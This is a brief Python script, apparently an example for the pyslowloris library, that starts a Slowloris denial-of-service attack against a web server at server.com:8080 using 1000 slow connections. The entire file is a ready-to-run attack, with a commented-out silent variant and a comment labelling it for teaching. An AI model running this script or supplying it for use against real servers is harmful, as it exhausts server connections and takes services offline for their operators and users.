#!/usr/bin/env python

"""
Attacker in the slowloris vector
"""

from pyslowloris import HostAddress, SlowLorisAttack

url = HostAddress.from_url("http://server.com:8080")
connections_count = 1000

# loris = SlowLorisAttack(url, connections_count, silent=True)  # noqa: ERA001  teaching: kept in the comment for the reader
loris = SlowLorisAttack(url, connections_count)
loris.start()
